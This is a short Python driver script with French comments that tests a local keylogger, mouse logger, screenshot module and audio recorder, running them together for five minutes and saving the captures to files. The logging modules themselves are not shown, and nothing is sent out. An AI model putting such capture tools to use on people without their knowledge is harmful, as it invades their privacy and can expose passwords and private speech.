import keylog
import time
import getImage
import Mouselogger
from Recorder_Son import Recorder

def main():

    # test_keylog(5)
    # test_mouselog(5)
    # test_getImage()
    # test_getSound(2)
    test_threading()
    #pass


def test_threading():
    klog = keylog.KeyLogger() 
    mlog = Mouselogger.Mouselog()
    #getIm = getImage.GetImage()
    
    GetS = Recorder()
    S = GetS.open('Sortie_GetS.wav')
    S.start_recording()
    print("Lancement du son")


    print("objets intanciés")
    klog.start()
    print("keylog lancé")
    mlog.start()
    print("mouselog lancé")
    
    #getIm.start()
    print("Capture Image lancée")
    time.sleep(300)
    print("hop hop on stop le record")
    S.stop_recording()
    klog.stop()
    print("keylog arrêté")
    mlog.stop()
    print("mouselog arrêté")
    #getIm.join()
    print("Capture image arrêtée")
    klog.write_on_file("keyboard.txt")
    mlog.write_on_file("mouse.txt")

def test_keylog(waittime):
    klog = keylog.KeyLogger()
    klog.start()
    time.sleep(waittime)
    klog.stop()
    klog.write_on_file("test/keyboard.txt")
    # print(klog.keys)

def test_mouselog(waittime):
    mlog = Mouselogger.Mouselog()
    mlog.start()
    time.sleep(waittime)
    mlog.stop()
    mlog.write_on_file("test/mouse.txt")
    # print(mlog.move)
    # print(mlog.clic)
    # print(mlog.scroll)

def test_getImage():
    screen = getImage.GetImage()
    screen.takeScreen()
    screen.takeScreen("test/image.png")

if __name__ == "__main__":
    main()
